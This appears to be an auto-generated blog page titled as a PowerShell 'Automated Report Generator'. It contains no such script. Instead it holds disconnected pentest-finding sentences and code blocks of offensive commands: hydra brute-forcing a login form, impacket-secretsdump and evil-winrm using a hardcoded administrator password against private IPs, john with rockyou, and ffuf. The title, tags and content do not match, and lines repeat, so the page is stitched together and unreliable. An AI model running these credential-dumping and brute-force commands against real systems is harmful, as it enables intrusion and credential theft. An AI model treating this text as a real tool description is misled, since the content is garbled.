---
TitleSEO: "Automated Report Generator in PowerShell | ZureFX"
TitlePost: "Automated Report Generator — PowerShell"
Author: "ZureFX"
Description: "A PowerShell script for automated report generator. Built for security research and automation."
Keywords: "python, parser, scanner, go, rust, powershell"
URL: "https://zurefx.github.io/scripting/script-automated-report-generator-343.html"
URL_IMAGES: ""
Date: "2024-10-05"
Tags: "Python, Parser, Scanner, Go, Rust, PowerShell"
Section: "scripting"
Lang: "en"
main_img: "script-automated-report-generator-343"
Permalink: "/scripting/script-automated-report-generator-343.html"
BtnLabel: "View Script"
Pick: 0
---
## Overview

### Description

The scheduled task ran with elevated privileges and could be abused for escalation. The application stored sensitive credentials in an unencrypted configuration file. Command injection was possible through unsanitized user input in the search functionality.

Built with **PowerShell** for offensive security automation.

### Requirements

- PowerShell
- `wpscan`
- `smbexec`
- `GetUserSPNs`

## Implementation

### Core Logic

The kernel version was outdated and vulnerable to a publicly known exploit. Lateral movement was facilitated by reusing discovered credentials across services.

```powershell
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
feroxbuster -h
```

The database credentials were hardcoded in the application source code. Network traffic analysis revealed unencrypted communications containing user credentials.

### Helper Functions

Unconstrained delegation was enabled on the compromised machine. Post-exploitation enumeration revealed a path to domain administrator privileges.

```powershell
evil-winrm -i 10.39.203.228 -u administrator -p 'P@ssw0rd!'
feroxbuster -h
impacket-secretsdump administrator:'P@ssw0rd!'@10.89.16.183
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

## Usage

### Basic Usage

The web application was vulnerable to Server-Side Template Injection (SSTI). The service account had excessive permissions assigned in Active Directory.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
impacket-secretsdump administrator:'P@ssw0rd!'@10.128.4.74
evil-winrm -i 10.55.119.61 -u administrator -p 'P@ssw0rd!'
```

### Advanced Options

The backup files contained sensitive information that should not have been accessible. The kernel version was outdated and vulnerable to a publicly known exploit. Authentication bypass was achieved through careful manipulation of the login mechanism.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.117.156.63 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
impacket-secretsdump administrator:'P@ssw0rd!'@10.69.178.101
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.25.142.54/FUZZ
```

## Output

### Example Output

Initial enumeration revealed several interesting open ports on the target. The web application was vulnerable to Server-Side Template Injection (SSTI).

```
[+] Scanning target...
[+] Found 17 results
[+] Done in 3.22s
```
